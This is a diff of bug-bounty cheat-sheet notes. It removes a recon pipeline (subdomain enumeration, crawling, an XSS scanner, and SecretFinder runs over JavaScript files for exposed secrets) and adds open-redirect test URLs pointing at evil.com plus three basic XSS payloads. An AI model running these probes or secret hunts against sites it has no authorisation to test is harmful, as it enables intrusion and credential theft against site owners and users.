@@ -1,15 +1,13 @@
-- __Add you domain name in domains.txt__
-  - __`subfinder -list domains.txt > subdomains.txt`__
-  - __`cat subdomains.txt | httpx-toolkit -ports 443,80,8080,8000,8888 -mc 200,403,400,500 -o alive.txt`__
-  - __`go install github.com/projectdiscovery/katana/cmd/katana@latest`__
-  - __`katana -list alive.txt -o katanacrawl.txt`__
-  - __`cat katanacrawl.txt | gfx xss* | tee xssfilter.txt`__
-  - __`git clone https://github.com/faiyazahmad07/xss_vibes.git`__
-  - __`cd xss_vibes`__
-  - __`python3 main.py -f /home/kali/xssfilter.txt`__
-  - __`cat katanacrawl.txt | grep js | tee jsfiles.txt`__
-  - __`cd xss_vibes`__
-  - __`python3 main.py -f /home/kali/xssfilter.txt`__
-  - __`git clone https://github.com/m4ll0k/SecretFinder.git`__
-  - __`cat jsfiles.txt | while read url; do python3 /home/kali/SecretFinder/SecretFinder.py -I $url -o cli; done`__
-  - __`cat katanacrawl.txt | while read url; do python3 /home/kali/SecretFinder/SecretFinder.py -I $url -o cli; done`__
+# Open redirect
+
+__`https://test.com/?redirect=https://www.google.com`__
+__`https://test.com/?redirect=https://www.google.com@evil.com`__
+
+
+# Cross-Site Scripting (XSS)
+
+- __`"><image src=x onerror=alert()>`__
+- __`"><image src=x onmouseover=alert()>`__
+- __`"><image src=x onmouseovr=document.write(1)>`__
+- > __If you are not getting /?id= in url you can use burpsuite__
+  - ![image1]()
